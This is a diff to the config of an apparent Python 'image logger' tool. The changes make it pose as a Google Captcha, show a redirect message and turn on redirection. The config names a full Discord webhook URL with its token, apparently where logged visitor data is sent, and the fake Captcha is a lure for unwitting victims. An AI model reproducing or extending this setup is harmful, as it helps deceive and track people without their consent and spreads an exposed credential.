@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1346160293163569225/PbWwUufcyIYWOS0grz91gsR8BM2hVsxBetzVRxN_Ym7rdMzWLTWDjqdWGYb9IJmpkwDm",
-    "image": "https://upload.wikimedia.org/wikipedia/fr/9/9d/Captcha_google_checkbox.gif", # You can also have a custom image by using a URL argument
+    "image": "https://images.bfmtv.com/8x8ofc-_TpJFr4pOfHy_c1f2L_U=/0x40:1264x751/1280x0/images/Exemple-de-Captcha-mis-en-place-par-Google-1436063.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -29,7 +29,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "Thanks for using our Captcha", # Message to show
+        "message": "Thanks for using our Captcha. You are going to be redirected.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -51,7 +51,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
+        "redirect": True, # Redirect to a webpage?
         "page": "https://screenmessage.com/fice" # Link to the webpage to redirect to 
     },
 
